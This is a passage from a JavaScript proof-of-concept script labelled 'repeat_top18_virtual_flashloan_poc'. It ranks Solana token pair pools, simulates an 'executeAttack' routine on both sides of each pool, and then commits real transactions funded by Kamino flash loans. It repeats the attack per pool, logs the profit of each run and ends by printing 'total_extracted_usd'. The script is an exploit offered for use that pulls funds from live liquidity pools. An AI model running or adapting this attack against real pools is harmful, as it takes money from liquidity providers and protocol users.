    .slice(0, TOP_N);

  const symbolMap = new Map();
  for (const mint of [...new Set(pricedPairs.flatMap((pair) => [pair.token0, pair.token1]))]) {
    symbolMap.set(mint, await tokenSymbol(mint));
  }
  const liquidityByMint = await loadKaminoLiquidity(connection, decimalsByMint);

  console.log("repeat_top18_virtual_flashloan_poc");
  console.log("rpc", RPC_URL);
  console.log("slot", slot);
  console.log("pairs_total", accounts.length);
  console.log("pairs_ranked", pricedPairs.length);
  console.log("repeats_per_pool", REPEATS);
  console.log("pre_swap_ppm", PRE_SWAP_PPM.toString());
  console.log("collateral_ppm", COLLATERAL_PPM.toString());
  console.log("actual_flashloan", "true");
  console.log("flash_venues", "kamino");
  console.log(
    "csv",
    "rank,pair,symbols,iteration,collateral_side,flash_venue,flashloan_ui,flashloan_usd,profit_usd,slot,cu,signature,status",
  );

  let totalProfitUsd = 0;
  const summaries = [];
  for (const [rankIndex, pair] of pricedPairs.entries()) {
    const rank = rankIndex + 1;
    const symbols = { token0: symbolMap.get(pair.token0), token1: symbolMap.get(pair.token1) };
    const contextBySide = new Map();
    let poolProfitUsd = 0;
    const poolRows = [];

    for (let iteration = 1; iteration <= REPEATS; iteration++) {
      const candidates = sideCandidates(pair, prices, liquidityByMint);
      let chosenCandidate = candidates.find((candidate) => candidate.flashVenue);
      let chosenSide = chosenCandidate?.side ?? candidates[0]?.side ?? true;
      let chosenPreview = null;
      let lastError = null;
      if (PREVIEW_BOTH_SIDES) {
        for (const candidate of candidates) {
          const side = candidate.side;
          const sideSymbol = side ? symbols.token0 : symbols.token1;
          if (!candidate.flashVenue) {
            lastError = new Error(
              `no_flash_liquidity:${sideSymbol}:need=${rawToUiString(candidate.principal, candidate.decimals)}:${candidate.mint}`,
            );
            continue;
          }
          try {
            const sideKey = side ? "token0" : "token1";
            const preview = await executeAttack(connection, program, pair, side, symbols, {
              commit: false,
              ctx: contextBySide.get(sideKey) || null,
              flashVenue: candidate.flashVenue,
            });
            preview.sideCandidate = candidate;
            contextBySide.set(sideKey, preview.ctx);
            if (!chosenPreview || preview.profitUsd > chosenPreview.profitUsd) {
              chosenPreview = preview;
              chosenSide = side;
              chosenCandidate = candidate;
            }
          } catch (err) {
            lastError = err;
          }
        }
      }
      if (PREVIEW_BOTH_SIDES && (!chosenPreview || chosenPreview.profitUsd <= MIN_PROFIT_USD)) {
        console.log(
          "csv",
          [
            rank,
            pair.pubkey,
            `${symbols.token0}/${symbols.token1}`,
            iteration,
            "n/a",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            `stopped:${String(lastError?.message || `best simulated profit ${chosenPreview?.profitUsd ?? "n/a"}`).replaceAll(",", ";").slice(0, 180)}`,
          ].join(","),
        );
        break;
      }

      let result = null;
      try {
        const sideKey = chosenSide ? "token0" : "token1";
        if (!chosenCandidate?.flashVenue) {
          throw new Error(`no_flash_liquidity:${chosenSide ? symbols.token0 : symbols.token1}`);
        }
        result = await executeAttack(connection, program, pair, chosenSide, symbols, {
          commit: true,
          ctx: contextBySide.get(sideKey) || null,
          flashVenue: chosenCandidate.flashVenue,
        });
        contextBySide.set(sideKey, result.ctx);
      } catch (err) {
        lastError = err;
      }
      if (!result) {
        console.log(
          "csv",
          [
            rank,
            pair.pubkey,
            `${symbols.token0}/${symbols.token1}`,
            iteration,
            candidates.length ? (chosenSide ? symbols.token0 : symbols.token1) : "n/a",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            `commit_failed:${String(lastError?.message || "no result").replaceAll(",", ";").slice(0, 220)}`,
          ].join(","),
        );
        break;
      }

      const collateralDecimals = result.collateralIsToken0 ? pair.token0Decimals : pair.token1Decimals;
      const collateralPrice = result.collateralIsToken0 ? pair.price0 : pair.price1;
      const flashloanUi = rawToUi(result.principal, collateralDecimals);
      const flashloanUsd = flashloanUi * collateralPrice;
      poolProfitUsd += result.profitUsd;
      totalProfitUsd += result.profitUsd;
      poolRows.push(result);
      console.log(
        "csv",
        [
          rank,
          pair.pubkey,
          `${symbols.token0}/${symbols.token1}`,
          iteration,
          result.collateralSymbol,
          result.flashVenue?.venue || "",
          flashloanUi.toFixed(6),
          flashloanUsd.toFixed(2),
          result.profitUsd.toFixed(2),
          result.slot,
          result.cu,
          result.signature || "",
          "ok",
        ].join(","),
      );
    }

    summaries.push({
      rank,
      pair: pair.pubkey,
      symbols: `${symbols.token0}/${symbols.token1}`,
      poolProfitUsd,
      iterations: poolRows.length,
      rows: poolRows.map((row) => ({
        side: row.collateralSymbol,
        venue: row.flashVenue?.venue || "none",
        flashloanUi: rawToUi(row.principal, row.collateralIsToken0 ? pair.token0Decimals : pair.token1Decimals),
        profitUsd: row.profitUsd,
        signature: row.signature || null,
      })),
    });
  }

  console.log("summary_json", JSON.stringify({ totalProfitUsd, summaries }, null, 2));
  console.log("total_extracted_usd", totalProfitUsd.toFixed(2));
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
